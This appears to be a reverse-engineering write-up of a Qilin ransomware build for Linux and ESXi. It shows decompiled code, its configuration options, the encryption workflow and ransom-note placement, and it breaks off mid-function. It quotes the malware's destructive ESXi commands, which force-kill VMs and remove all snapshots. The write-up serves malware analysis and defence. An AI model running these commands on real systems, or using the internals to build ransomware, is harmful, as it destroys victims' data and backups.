        00551a10 2c af 4e        addr       s_/var/lib/elasticsearch_004eaf2c                = "/var/lib/elasticsearch"
```

File extension whitelist:
```
                             PTR_s_3ds_005512a0                              XREF[4]:     mw_main:004014ae(*), 
                                                                                          mw_parse_config:00403902(R), 
                                                                                          mw_parse_config:00403914(*), 
                                                                                          00551280(*)  
        005512a0 80 aa 4e        addr       s_3ds_004eaa80                                   = "3ds"
                             PTR_s_3g2_005512a8                              XREF[1]:     mw_parse_config:00403902(R)  
        005512a8 84 aa 4e        addr       s_3g2_004eaa84                                   = "3g2"
        005512b0 88 aa 4e        addr       s_3gp_004eaa88                                   = "3gp"
        005512b8 8c aa 4e        addr       s_7z_004eaa8c                                    = "7z"
        005512c0 8f aa 4e        addr       s_aac_004eaa8f                                   = "aac"
        005512c8 93 aa 4e        addr       s_abw_004eaa93                                   = "abw"
        005512d0 97 aa 4e        addr       s_ac3_004eaa97                                   = "ac3"
        005512d8 9b aa 4e        addr       s_accdb_004eaa9b                                 = "accdb"
        005512e0 a1 aa 4e        addr       s_ai_004eaaa1                                    = "ai"
        005512e8 a4 aa 4e        addr       s_aif_004eaaa4                                   = "aif"
        005512f0 a8 aa 4e        addr       s_aiff_004eaaa8                                  = "aiff"
        005512f8 ad aa 4e        addr       s_amr_004eaaad                                   = "amr"
        00551300 b1 aa 4e        addr       s_apk_004eaab1                                   = "apk"
        00551308 b5 aa 4e        addr       s_app_004eaab5                                   = "app"
        00551310 b9 aa 4e        addr       s_asf_004eaab9                                   = "asf"
        00551318 bd aa 4e        addr       s_asx_004eaabd                                   = "asx"
        00551320 c1 aa 4e        addr       s_atom_004eaac1                                  = "atom"
        00551328 c6 aa 4e        addr       s_avi_004eaac6                                   = "avi"
        00551330 ca aa 4e        addr       s_bak_004eaaca                                   = "bak"
        00551338 ce aa 4e        addr       s_bat_004eaace                                   = "bat"
        00551340 70 ad 4e        addr       s_bmp_004ead6f+1                                 = "bmp"
        00551348 d2 aa 4e        addr       s_bup_004eaad2                                   = "bup"
        00551350 d6 aa 4e        addr       s_bz2_004eaad6                                   = "bz2"
        00551358 da aa 4e        addr       s_cab_004eaada                                   = "cab"
        00551360 de aa 4e        addr       s_cbr_004eaade                                   = "cbr"
        00551368 e2 aa 4e        addr       s_cbz_004eaae2                                   = "cbz"
        00551370 e6 aa 4e        addr       s_cda_004eaae6                                   = "cda"
        00551378 ea aa 4e        addr       s_cdr_004eaaea                                   = "cdr"
        00551380 ee aa 4e        addr       s_chm_004eaaee                                   = "chm"
        00551388 f2 aa 4e        addr       s_class_004eaaf2                                 = "class"
        00551390 f8 aa 4e        addr       s_cmd_004eaaf8                                   = "cmd"
        00551398 5c 71 52        addr       s_conf_00527150+12                               = "conf"
        005513a0 d3 ac 4e        addr       s_cow_004eacd2+1                                 = "cow"
        005513a8 fc aa 4e        addr       s_cpp_004eaafc                                   = "cpp"
        005513b0 00 ab 4e        addr       s_cr2_004eab00                                   = "cr2"
        005513b8 04 ab 4e        addr       s_crdownload_004eab04                            = "crdownload"
        005513c0 b8 ab 4e        addr       s_cs_004eabb7+1                                  = "cs"
        005513c8 0f ab 4e        addr       s_csv_004eab0f                                   = "csv"
        005513d0 13 ab 4e        addr       s_cue_004eab13                                   = "cue"
        005513d8 17 ab 4e        addr       s_cur_004eab17                                   = "cur"
        005513e0 1b ab 4e        addr       s_dat_004eab1b                                   = "dat"
        005513e8 9e aa 4e        addr       s_db_004eaa9b+3                                  = "db"
        005513f0 1f ab 4e        addr       s_dbf_004eab1f                                   = "dbf"
        005513f8 23 ab 4e        addr       s_dds_004eab23                                   = "dds"
        00551400 27 ab 4e        addr       s_deb_004eab27                                   = "deb"
        00551408 2b ab 4e        addr       s_der_004eab2b                                   = "der"
        00551410 2f ab 4e        addr       s_desktop_004eab2f                               = "desktop"
        00551418 37 ab 4e        addr       s_dmg_004eab37                                   = "dmg"
        00551420 3b ab 4e        addr       s_dng_004eab3b                                   = "dng"
        00551428 3f ab 4e        addr       s_doc_004eab3f                                   = "doc"
        00551430 43 ab 4e        addr       s_docm_004eab43                                  = "docm"
        00551438 48 ab 4e        addr       s_dot_004eab48                                   = "dot"
        00551440 4c ab 4e        addr       s_dotm_004eab4c                                  = "dotm"
        00551448 51 ab 4e        addr       s_dotx_004eab51                                  = "dotx"
        00551450 56 ab 4e        addr       s_dpx_004eab56                                   = "dpx"
        00551458 5a ab 4e        addr       s_drv_004eab5a                                   = "drv"
        00551460 5e ab 4e        addr       s_dtd_004eab5e                                   = "dtd"
        00551468 62 ab 4e        addr       s_dvi_004eab62                                   = "dvi"
        00551470 66 ab 4e        addr       s_dwg_004eab66                                   = "dwg"
        00551478 6a ab 4e        addr       s_dxf_004eab6a                                   = "dxf"
        00551480 6e ab 4e        addr       s_eml_004eab6e                                   = "eml"
        00551488 72 ab 4e        addr       s_eps_004eab72                                   = "eps"
        00551490 76 ab 4e        addr       s_epub_004eab76                                  = "epub"
        00551498 7b ab 4e        addr       s_f4v_004eab7b                                   = "f4v"
        005514a0 7f ab 4e        addr       s_fnt_004eab7f                                   = "fnt"
        005514a8 83 ab 4e        addr       s_fon_004eab83                                   = "fon"
        005514b0 87 ab 4e        addr       s_gam_004eab87                                   = "gam"
        005514b8 8b ab 4e        addr       s_ged_004eab8b                                   = "ged"
        005514c0 8f ab 4e        addr       s_gif_004eab8f                                   = "gif"
        005514c8 93 ab 4e        addr       s_gpx_004eab93                                   = "gpx"
        005514d0 f5 af 4e        addr       s_gz_004eafec+9                                  = "gz"
        005514d8 97 ab 4e        addr       s_h264_004eab97                                  = "h264"
        005514e0 9c ab 4e        addr       s_hdr_004eab9c                                   = "hdr"
        005514e8 a0 ab 4e        addr       s_hpp_004eaba0                                   = "hpp"
        005514f0 a4 ab 4e        addr       s_hqx_004eaba4                                   = "hqx"
        005514f8 a8 ab 4e        addr       s_htm_004eaba8                                   = "htm"
        00551500 fa ac 4e        addr       s_html_004eacf9+1                                = "html"
        00551508 ac ab 4e        addr       s_ibooks_004eabac                                = "ibooks"
        00551510 b3 ab 4e        addr       s_ico_004eabb3                                   = "ico"
        00551518 b7 ab 4e        addr       s_ics_004eabb7                                   = "ics"
        00551520 a9 aa 4e        addr       s_iff_004eaaa8+1                                 = "iff"
        00551528 bb ab 4e        addr       s_image_004eabbb                                 = "image"
        00551530 c1 ab 4e        addr       s_img_004eabc1                                   = "img"
        00551538 c5 ab 4e        addr       s_indd_004eabc5                                  = "indd"
        00551540 ca ab 4e        addr       s_iso_004eabca                                   = "iso"
        00551548 ce ab 4e        addr       s_jar_004eabce                                   = "jar"
        00551550 d2 ab 4e        addr       s_java_004eabd2                                  = "java"
        00551558 d7 ab 4e        addr       s_jfif_004eabd7                                  = "jfif"
        00551560 dc ab 4e        addr       s_jpe_004eabdc                                   = "jpe"
        00551568 e0 ab 4e        addr       s_jpeg_004eabe0                                  = "jpeg"
        00551570 e5 ab 4e        addr       s_jpf_004eabe5                                   = "jpf"
        00551578 e9 ab 4e        addr       s_jpg_004eabe9                                   = "jpg"
        00551580 ed ab 4e        addr       s_js_004eabed                                    = "js"
        00551588 f0 ab 4e        addr       s_json_004eabf0                                  = "json"
        00551590 f5 ab 4e        addr       s_jsp_004eabf5                                   = "jsp"
        00551598 f9 ab 4e        addr       s_key_004eabf9                                   = "key"
        005515a0 fd ab 4e        addr       s_kml_004eabfd                                   = "kml"
        005515a8 01 ac 4e        addr       s_kmz_004eac01                                   = "kmz"
        005515b0 05 ac 4e        addr       s_log_004eac05                                   = "log"
        005515b8 09 ac 4e        addr       s_m4a_004eac09                                   = "m4a"
        005515c0 0d ac 4e        addr       s_m4b_004eac0d                                   = "m4b"
        005515c8 11 ac 4e        addr       s_m4p_004eac11                                   = "m4p"
        005515d0 15 ac 4e        addr       s_m4v_004eac15                                   = "m4v"
        005515d8 19 ac 4e        addr       s_mcd_004eac19                                   = "mcd"
        005515e0 1d ac 4e        addr       s_mdbx_004eac1d                                  = "mdbx"
        005515e8 22 ac 4e        addr       s_mht_004eac22                                   = "mht"
        005515f0 26 ac 4e        addr       s_mid_004eac26                                   = "mid"
        005515f8 2a ac 4e        addr       s_mkv_004eac2a                                   = "mkv"
        00551600 ac ad 4e        addr       s_ml_004eadaa+2                                  = "ml"
        00551608 2e ac 4e        addr       s_mobi_004eac2e                                  = "mobi"
        00551610 33 ac 4e        addr       s_mov_004eac33                                   = "mov"
        00551618 37 ac 4e        addr       s_mp3_004eac37                                   = "mp3"
        00551620 3b ac 4e        addr       s_mp4_004eac3b                                   = "mp4"
        00551628 3f ac 4e        addr       s_mpa_004eac3f                                   = "mpa"
        00551630 43 ac 4e        addr       s_mpeg_004eac43                                  = "mpeg"
        00551638 48 ac 4e        addr       s_mpg_004eac48                                   = "mpg"
        00551640 4c ac 4e        addr       s_msg_004eac4c                                   = "msg"
        00551648 50 ac 4e        addr       s_nes_004eac50                                   = "nes"
        00551650 54 ac 4e        addr       s_numbers_004eac54                               = "numbers"
        00551658 5c ac 4e        addr       s_odp_004eac5c                                   = "odp"
        00551660 60 ac 4e        addr       s_ods_004eac60                                   = "ods"
        00551668 64 ac 4e        addr       s_odt_004eac64                                   = "odt"
        00551670 68 ac 4e        addr       s_ogg_004eac68                                   = "ogg"
        00551678 6c ac 4e        addr       s_ogv_004eac6c                                   = "ogv"
        00551680 70 ac 4e        addr       s_otf_004eac70                                   = "otf"
        00551688 74 ac 4e        addr       s_ova_004eac74                                   = "ova"
        00551690 78 ac 4e        addr       s_ovf_004eac78                                   = "ovf"
        00551698 7c ac 4e        addr       s_pages_004eac7c                                 = "pages"
        005516a0 82 ac 4e        addr       s_parallels_004eac82                             = "parallels"
        005516a8 8c ac 4e        addr       s_pcast_004eac8c                                 = "pcast"
        005516b0 92 ac 4e        addr       s_pct_004eac92                                   = "pct"
        005516b8 96 ac 4e        addr       s_pdb_004eac96                                   = "pdb"
        005516c0 9a ac 4e        addr       s_pdf_004eac9a                                   = "pdf"
        005516c8 9e ac 4e        addr       s_pds_004eac9e                                   = "pds"
        005516d0 a2 ac 4e        addr       s_pef_004eaca2                                   = "pef"
        005516d8 a6 ac 4e        addr       s_php_004eaca6                                   = "php"
        005516e0 aa ac 4e        addr       s_pkg_004eacaa                                   = "pkg"
        005516e8 ae ac 4e        addr       s_pl_004eacae                                    = "pl"
        005516f0 b1 ac 4e        addr       s_plist_004eacb1                                 = "plist"
        005516f8 b7 ac 4e        addr       s_png_004eacb7                                   = "png"
        00551700 bb ac 4e        addr       s_pptm_004eacbb                                  = "pptm"
        00551708 c0 ac 4e        addr       s_prproj_004eacc0                                = "prproj"
        00551710 73 ab 4e        addr       s_ps_004eab72+1                                  = "ps"
        00551718 c7 ac 4e        addr       s_psd_004eacc7                                   = "psd"
        00551720 cb ac 4e        addr       s_ptx_004eaccb                                   = "ptx"
        00551728 cf ac 4e        addr       s_py_004eaccf                                    = "py"
        00551730 d2 ac 4e        addr       s_qcow_004eacd2                                  = "qcow"
        00551738 d7 ac 4e        addr       s_qcow2_004eacd7                                 = "qcow2"
        00551740 dd ac 4e        addr       s_qed_004eacdd                                   = "qed"
        00551748 e1 ac 4e        addr       s_qt_004eace1                                    = "qt"
        00551750 e4 ac 4e        addr       s_r3d_004eace4                                   = "r3d"
        00551758 09 af 4e        addr       s_ra_004eaef9+16                                 = "ra"
        00551760 e8 ac 4e        addr       s_rar_004eace8                                   = "rar"
        00551768 81 9f 4e        addr       s_rm_004e9f79+8                                  = "rm"
        00551770 ec ac 4e        addr       s_rmvb_004eacec                                  = "rmvb"
        00551778 f1 ac 4e        addr       s_rtf_004eacf1                                   = "rtf"
        00551780 5b ab 4e        addr       s_rv_004eab5a+1                                  = "rv"
        00551788 f5 ac 4e        addr       s_rw2_004eacf5                                   = "rw2"
        00551790 c0 57 52        addr       s_sh_005257c0                                    = "sh"
        00551798 f9 ac 4e        addr       s_shtml_004eacf9                                 = "shtml"
        005517a0 ff ac 4e        addr       s_sit_004eacff                                   = "sit"
        005517a8 03 ad 4e        addr       s_sitx_004ead03                                  = "sitx"
        005517b0 08 ad 4e        addr       s_sketch_004ead08                                = "sketch"
        005517b8 0f ad 4e        addr       s_spx_004ead0f                                   = "spx"
        005517c0 b5 ae 4e        addr       s_sql_004eaea5+16                                = "sql"
        005517c8 13 ad 4e        addr       s_srt_004ead13                                   = "srt"
        005517d0 17 ad 4e        addr       s_svg_004ead17                                   = "svg"
        005517d8 1b ad 4e        addr       s_swf_004ead1b                                   = "swf"
        005517e0 1f ad 4e        addr       s_tar_004ead1f                                   = "tar"
        005517e8 23 ad 4e        addr       s_tga_004ead23                                   = "tga"
        005517f0 fe af 4e        addr       s_tgz_004eaff8+6                                 = "tgz"
        005517f8 27 ad 4e        addr       s_thmx_004ead27                                  = "thmx"
        00551800 2c ad 4e        addr       s_tif_004ead2c                                   = "tif"
        00551808 30 ad 4e        addr       s_tiff_004ead30                                  = "tiff"
        00551810 35 ad 4e        addr       s_torrent_004ead35                               = "torrent"
        00551818 3d ad 4e        addr       s_ttf_004ead3d                                   = "ttf"
        00551820 e5 9c 4e        addr       s_txt_004e9cda+11                                = "txt"
        00551828 41 ad 4e        addr       s_url_004ead41                                   = "url"
        00551830 45 ad 4e        addr       s_vdi_004ead45                                   = "vdi"
        00551838 49 ad 4e        addr       s_vhd_004ead49                                   = "vhd"
        00551840 4d ad 4e        addr       s_vhdx_004ead4d                                  = "vhdx"
        00551848 52 ad 4e        addr       s_vmdk_004ead52                                  = "vmdk"
        00551850 57 ad 4e        addr       s_vmem_004ead57                                  = "vmem"
        00551858 5c ad 4e        addr       s_vob_004ead5c                                   = "vob"
        00551860 60 ad 4e        addr       s_vswp_004ead60                                  = "vswp"
        00551868 65 ad 4e        addr       s_vvfat_004ead65                                 = "vvfat"
        00551870 6b ad 4e        addr       s_wav_004ead6b                                   = "wav"
        00551878 6f ad 4e        addr       s_wbmp_004ead6f                                  = "wbmp"
        00551880 74 ad 4e        addr       s_webm_004ead74                                  = "webm"
        00551888 79 ad 4e        addr       s_webp_004ead79                                  = "webp"
        00551890 7e ad 4e        addr       s_wm_004ead7e                                    = "wm"
        00551898 81 ad 4e        addr       s_wma_004ead81                                   = "wma"
        005518a0 85 ad 4e        addr       s_wmv_004ead85                                   = "wmv"
        005518a8 89 ad 4e        addr       s_wpd_004ead89                                   = "wpd"
        005518b0 8d ad 4e        addr       s_wps_004ead8d                                   = "wps"
        005518b8 91 ad 4e        addr       s_xhtml_004ead91                                 = "xhtml"
        005518c0 97 ad 4e        addr       s_xlsm_004ead97                                  = "xlsm"
        005518c8 9c ad 4e        addr       s_xml_004ead9c                                   = "xml"
        005518d0 a0 ad 4e        addr       s_xspf_004eada0                                  = "xspf"
        005518d8 a5 ad 4e        addr       s_xvid_004eada5                                  = "xvid"
        005518e0 aa ad 4e        addr       s_yaml_004eadaa                                  = "yaml"
        005518e8 af ad 4e        addr       s_yml_004eadaf                                   = "yml"
        005518f0 b3 ad 4e        addr       s_zip_004eadb3                                   = "zip"
        005518f8 b7 ad 4e        addr       s_zipx_004eadb7                                  = "zipx"
```

Encrypted extension: `"o7L03e8F9J"`

```
                             PTR_s_o7L03e8F9J_00551c60                       XREF[9]:     mw_main:00401084(R), 
                                                                                          mw_main:00401778(R), 
                                                                                          mw_main:004017e3(R), 
                                                                                          mw_main:00401880(R), 
                                                                                          mw_main:004018ea(R), 
                                                                                          mw_init_env:00401ebc(R), 
                                                                                          004026d6(R), 
                                                                                          mw_parse_config:0040393d(R), 
                                                                                          FUN_00403d00:00403dfc(R)  
        00551c60 99 b0 4e        addr       s_o7L03e8F9J_004eb099                            = "o7L03e8F9J"

```

#### Main functionality

After loading the configuration the program checks if it is in whitelist or blacklist mode, and if in blacklist mode ensures the necessary paths argument is provided.

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
    case 0x70:
    case 0x10b:
      uVar6 = FUN_004d9df5(DAT_0055efd8);
      *(undefined8 *)(piVar5 + 0x18) = uVar6;
      mw_log(4,"Search path: %s\n",uVar6);
      break;
...
    case 0x77:
    case 0x10f:
      *(undefined *)(piVar5 + 0x30) = 1;
      mw_log(4,"Enabled whitelist mode: %d\n",1);
      break;
...
  if ((*(char *)(piVar5 + 0x30) != '\0') ||
     (pcVar14 = "No path specified! It is mandatory for blacklist mode\n",
     *(long *)(piVar5 + 0x18) != 0)) {
...
```
It then verifies whether the provided password is correct. For dynamic analysis without the password, we will later patch the `if (ret != 0) {...}` check to allow the program to continue even with an incorrect password.

```c
...
    if (*(long *)(piVar5 + 0x2c) != 0) {
      uVar6 = mw_alloc_w(0x20);
      pvVar2 = *(void **)(piVar5 + 0x2c);
      uVar7 = mw_strlen(pvVar2);
      FUN_0042abd1(pvVar2,uVar7,uVar6);
      ret = FUN_004d93d0(*(undefined8 *)(piVar5 + 0x1a),uVar6,0x20);
      if (ret != 0) {
        mw_log(0,"Password is not correct!\n");
        mw_free(uVar6);
        FUN_00401ba0(piVar5);
                    /* WARNING: Subroutine does not return */
        mw_exit(1);
      }
```

Depending on the mode (blacklist/whitelist) the program updates certain directory and file path variables.

```c
      if (*(char *)(piVar5 + 0x30) == '\0') {
        *(undefined **)(piVar5 + 0x1e) = PTR_PTR_s_/boot/_00551ba0;
        *(undefined **)(piVar5 + 0x20) = PTR_PTR_s_initrd_00551b38;
        puVar10 = PTR_PTR_s_v00_00551a20;
      }
      else {
        *(undefined **)(piVar5 + 0x1e) = PTR_PTR_s_/home_00551908;
        *(undefined8 *)(piVar5 + 0x20) = DAT_005534e0;
        puVar10 = PTR_PTR_s_3ds_00551280;
      }
```

It checks if backgrounding is enabled and whether to start the encryption process.

```c
    case 100:
    case 0x100:
      mw_log_level = 4;
      mw_log(4,"Debug logging enabled\n");
      piVar5[0x2e] = 1;
      mw_log(4,"Backgrounding disabled\n");
      break;
...
    case 0x79:
    case 0x110:
      *(undefined *)((long)piVar5 + 0xc1) = 1;
      mw_log(4,"Assume answer \'yes\' on all questions enabled (script mode)\n");
      break;
...
      if (piVar5[0x2e] == 0) {
        while (*(char *)((long)piVar5 + 0xc1) == '\0') {
          FUN_004d5e58("Are you sure to start encryption? (y/n) ");
...
          if (cVar3 == 'n') goto LAB_004016e9;
          if (cVar3 == 'y') break;
...
        ret = mw_clone_and_futex();
        if (ret == -1) {
          puVar12 = (undefined4 *)FUN_004d4823();
          uVar4 = *puVar12;
          uVar6 = mw_get_error_msg(uVar4);
          mw_log(1,"Failed to clone(): %s (%d)\n",uVar6,uVar4);
        }
        else {
          if (0 < ret) {
            FUN_004d5d81("Process gone into background");
                    /* WARNING: Subroutine does not return */
            mw_exit(0);
          }
...
LAB_004016e9:
                    /* WARNING: Subroutine does not return */
      mw_exit(0);
```

`mw_clone_and_futex()` internally uses the `clone()` and `futex()` syscalls to create a child process and synchronize it with the parent.

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined mw_clone_and_futex()
...
        004dcc62 b8 38 00        MOV        EAX, 0x38
        004dcc67 0f 05           SYSCALL
...
        004dcd1f 41 bd ca        MOV        R13D, 0xca
...
        004dcd57 44 89 e8        MOV        EAX, R13D
...
        004dcd5f 0f 05           SYSCALL
```

The child process (`ret == 0`) calls `setsid()` to properly detach from the controlling terminal and sets up logging.

```c
          if ((ret == 0) && (mw_setsid(), 0 < mw_log_level)) {
            uVar4 = mw_getpid();
            mw_sprintf(&local_438,"%s.log.%d",*param_2,uVar4);
            DAT_00551c68 = mw_open_log_and_futex_sync(&local_438,0x41);
            if (DAT_00551c68 == -1) {
              puVar12 = (undefined4 *)FUN_004d4823();
              uVar6 = mw_get_error_msg(*puVar12);
              mw_log(1,"Failed to open log file \'%s\' (%d: %s). Falling back to console output\n",
                     &local_438,*puVar12,uVar6);
            }
            else {
              mw_log(4,"Log file \'%s\' opened...\n",&local_438);
            }
          }
```
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined mw_setsid()
             undefined         AL:1           <RETURN>
                             mw_setsid                                       XREF[2]:     mw_main:00401710(c), 0054a6d8(*)  
        004d42b1 b8 70 00        MOV        EAX, 0x70
        004d42b6 0f 05           SYSCALL

```

The program sets up threading based on the detected number of CPU cores.

```c
void mw_init_env(int *param_1)

{
...
    mw_detect_os(param_1);
    if (*param_1 == 3) {
      iVar3 = mw_detect_cpu_bsd();
    }
    else {
      iVar3 = mw_detect_cpu_other();
    }
    param_1[1] = iVar3;
```

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
    uVar6 = mw_thpool_init(piVar5[1]);
```

Based on the code structure and error messages in `mw_thpool_init()` the program uses the [C-Thread-Pool open-source library](https://github.com/Pithikos/C-Thread-Pool/blob/4eb5a69a439f252d2839af16b98d94464883dfa5/thpool.c#L140).

```c
long * mw_thpool_init(int param_1)

{
...
  iVar5 = 0;
  if (-1 < param_1) {
    iVar5 = param_1;
  }
  DAT_00553540 = 0;
  DAT_00553544 = 1;
  plVar2 = (long *)mw_alloc(0xb0);
  if (plVar2 == (long *)0x0) {
    FUN_004d8216("thpool_init(): Could not allocate memory for thread pool\n",1,0x39,
                 PTR_DAT_005531f8);
  }
  else {
    *(undefined4 *)(plVar2 + 1) = 0;
    *(undefined4 *)((long)plVar2 + 0xc) = 0;
    *(undefined4 *)(plVar2 + 0x15) = 0;
    plVar2[0x12] = 0;
    plVar2[0x13] = 0;
    lVar3 = mw_alloc(0x60);
    plVar2[0x14] = lVar3;
    if (lVar3 == 0) {
      FUN_004d8216("thpool_init(): Could not allocate memory for job queue\n",1,0x37,
                   PTR_DAT_005531f8);
      mw_free(plVar2);
      plVar2 = (long *)0x0;
...
```

The program likely writes the ransomware notes to MOTD as well. Based on the static analysis we can see that the password (which is part of the ransomware notes) is passed to the function but the ransomware notes string itself is neither passed nor referenced in `mw_write_motd()` (only in `mw_main()`). At first glance it is not obvious what exactly is written there but we will figure this out during dynamic analysis.

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
    case 0x10c:
      uVar6 = FUN_004d9df5(DAT_0055efd8);
      *(undefined8 *)(piVar5 + 0x2c) = uVar6;
      mw_log(4,"Password: %s\n",uVar6);
...
      mw_strcpy(*(undefined8 *)(piVar5 + 0x24),*(undefined8 *)(piVar5 + 0x2c));
...
      if (*piVar5 == 3) {
        mw_write_motd("/etc/motd.template",*(undefined8 *)(piVar5 + 0x24));
        mw_write_motd("/var/run/motd",*(undefined8 *)(piVar5 + 0x24));
      }
      else {
        mw_write_motd("/etc/motd",*(undefined8 *)(piVar5 + 0x24));
      }
```

```
                             s_sword:_004e9c06                               XREF[2,1]:   mw_main:0040142c(R), 
                             s_--_Qilin_Your_network/system_was_004e9700                  mw_main:00401433(*), 
                                                                                          mw_main:00401442(R)  
        004e9700 2d 2d 20        ds         "-- Qilin \r\n\r\nYour network/system was encr

```

The `mw_write_motd()` function calls [fopen()](https://man7.org/linux/man-pages/man3/fopen.3.html) based on the arguments passed to it.

```
void mw_write_motd(undefined8 param_1,void *param_2)

{
...
  lVar1 = mw_fopen(param_1,"w");
```

The `*piVar5` variable is the detected OS.

```c
undefined4 mw_detect_os(undefined4 *param_1)

{
...
    iVar1 = FUN_004d9dc5(auStack_1a8,"Linux");
    if (iVar1 == 0) {
      *param_1 = 1;
      mw_log(4,"Detected OS: Linux (%d)\n",1);
      return 0;
    }
    iVar1 = FUN_004d9dc5(auStack_1a8,"VMKernel");
    if (iVar1 == 0) {
      *param_1 = 2;
      mw_log(4,"Detected OS: ESXi (%d)\n",2);
      return 0;
    }
    iVar1 = FUN_004d9dc5(auStack_1a8,"FreeBSD");
    if (iVar1 != 0) {
      *param_1 = 0;
      mw_log(4,"Detected OS: unknown (%d)\n",0);
      return 0;
    }
    *param_1 = 3;
    mw_log(4,"Detected OS: FreeBSD (%d)\n",3);
    uVar2 = 0;
  }
  return uVar2;
}
```

The OS information is later used to determine whether ESXi-specific commands (like killing VMs and removing snapshots) should be executed. On other operating systems these ESXi-specific functions simply return without action.

If `--no-vm-kill` is not passed the program lists and kills VMs to forcibly release file locks (e.g. `.vmdk` virtual disk files) allowing them to be encrypted or deleted.

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
    case 0x10a:
      *(undefined *)((long)piVar5 + 0xa1) = 1;
      mw_log(4,"Kill VMs disabled\n");
      break;
...
      if (*(char *)((long)piVar5 + 0xa1) == '\0') {
        mw_list_and_kill_vm_processes_w(*piVar5,DAT_005534e8);
```

```c
undefined8 mw_list_and_kill_vm_processes(undefined8 param_1)

{
...
  lVar3 = mw_run_cmd_w("esxcli vm process list","r");
```
```c
void mw_kill_vm_process(undefined8 param_1)

{
...
  mw_sprintf(auStack_1008,"esxcli vm process kill -t force -w %llu",param_1);
  iVar1 = mw_run_cmd2_w(auStack_1008);
```

Both `mw_run_cmd_w()` and `mw_run_cmd2_w()` eventually call `execve()`.

```c
long mw_run_cmd(char *param_1,char *param_2)

{
...
          mw_execve_w("/bin/sh","sh","-c",param_1,(char *)0x0);
```

```c

ulong mw_run_cmd2(char *param_1)

{
...
          local_38[0] = "/bin/sh";
          local_38[1] = "-c";
          local_38[3] = (char *)0x0;
          local_38[2] = param_1;
...
          mw_execve("/bin/sh",local_38,DAT_005592a8);
```
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined mw_execve()
             undefined         AL:1           <RETURN>
                             mw_execve                                       XREF[3]:     mw_execve_w:004db92a(c), 
                                                                                          mw_run_cmd2:004dd6b2(c), 
                                                                                          0054e238(*)  
        004e0c47 b8 3b 00        MOV        EAX, 0x3b
        004e0c4c 0f 05           SYSCALL

```

Snapshots are removed if `--no-snap-rm` is not passed. They are probably deleted instead of getting encrypted because that would take too much time.

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
    case 0x109:
      *(undefined *)((long)piVar5 + 0xa3) = 1;
      mw_log(4,"Remove snapshots disabled\n");
      break;
```

```c
undefined8 mw_remove_snapshots_ww(undefined4 *param_1)

{
...
      if (*(char *)((long)param_1 + 0xa3) == '\0') goto LAB_00401b04;
...
LAB_00401b04:
      mw_remove_snapshots_w(*param_1);
```

```c
undefined8 mw_remove_snapshots(void)

{
...
  lVar1 = mw_run_cmd("vim-cmd vmsvc/getallvms","r");
...
        FUN_004d5f8b(auStack_218,0x200,"vim-cmd vmsvc/snapshot.removeall %llu > /dev/null 2>&1",
                     uVar3);
        mw_run_cmd2_w(auStack_218);
...
```

The program calls `nftw()` to recursively iterate over the directories and files.

The `nftw()` function is easily identified by the `*nftw*` strings and its signature matches [this one](https://git.musl-libc.org/cgit/musl/tree/src/misc/nftw.c#n123) from musl. Even the function body is perfectly matching.

```c
int nftw(const char *path, int (*fn)(const char *, const struct stat *, int, struct FTW *), int fd_limit, int flags)
{
	int r, cs;
	size_t l;
	char pathbuf[PATH_MAX+1];

	if (fd_limit <= 0) return 0;

	l = strlen(path);
	if (l > PATH_MAX) {
		errno = ENAMETOOLONG;
		return -1;
	}
	memcpy(pathbuf, path, l+1);
	
	pthread_setcancelstate(PTHREAD_CANCEL_DISABLE, &cs);
	r = do_nftw(pathbuf, fn, fd_limit, flags, NULL);
	pthread_setcancelstate(cs, 0);
	return r;
}
```

```c
undefined4 mw_nftw(undefined8 *param_1,undefined8 param_2,int param_3,undefined4 param_4)

{
  undefined4 uVar1;
  ulong uVar2;
  undefined4 *puVar3;
  ulong uVar4;
  long lVar5;
  undefined8 *puVar6;
  byte bVar7;
  undefined4 local_103c;
  undefined8 local_1038 [514];
  
  bVar7 = 0;
  if (param_3 < 1) {
    return 0;
  }
  uVar2 = mw_strlen(param_1);
  if (0x1000 < uVar2) {
    mw_log(1,"%s: `%s` is too long\n","nftw_",param_1);
    puVar3 = (undefined4 *)FUN_004d4823();
    *puVar3 = 0x24;
    return 0xffffffff;
  }
  uVar2 = uVar2 + 1;
  puVar6 = local_1038;
  if (7 < (uint)uVar2) {
    for (uVar4 = uVar2 >> 3 & 0x1fffffff; uVar4 != 0; uVar4 = uVar4 - 1) {
      *puVar6 = *param_1;
      param_1 = param_1 + (ulong)bVar7 * -2 + 1;
      puVar6 = puVar6 + (ulong)bVar7 * -2 + 1;
    }
  }
  if ((uVar2 & 4) == 0) {
    lVar5 = 0;
  }
  else {
    *(undefined4 *)puVar6 = *(undefined4 *)param_1;
    lVar5 = 4;
  }
  if ((uVar2 & 2) != 0) {
    *(undefined2 *)((long)puVar6 + lVar5) = *(undefined2 *)((long)param_1 + lVar5);
    lVar5 = lVar5 + 2;
  }
  if ((uVar2 & 1) != 0) {
    *(undefined *)((long)puVar6 + lVar5) = *(undefined *)((long)param_1 + lVar5);
  }
  FUN_004e0811(1,&local_103c);
  uVar1 = mw_do_nftw(local_1038,param_2,param_3,param_4,0);
  FUN_004e0811(local_103c,0);
  return uVar1;
}
```

The directories are specified with `--path` and `nftw()` calls `mw_nftw_callback()` for each file/directory. If no path is specified, it defaults to `/` (root). With `--dry-run` no files are modified.

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
    case 0x70:
    case 0x10b:
      uVar6 = FUN_004d9df5(DAT_0055efd8);
      *(undefined8 *)(piVar5 + 0x18) = uVar6;
      mw_log(4,"Search path: %s\n",uVar6);
      break;
...
    case 0x101:
      *(undefined *)(piVar5 + 0x28) = 1;
      mw_log(4,"Dry run enabled\n");
      break;
...
      *(undefined (*) [16])(puVar11 + 2) = (undefined  [16])0x0;
      uVar6 = *(undefined8 *)(piVar5 + 0x18);
...
      puVar11[1] = mw_thpool_add_work_w;
      *puVar11 = uVar6;
      puVar11[3] = piVar5;
...
        mw_nftw_w(puVar11);
```

```c

int mw_nftw_w(char **param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  if (DAT_00553500 == 0) {
    DAT_00553500 = 1;
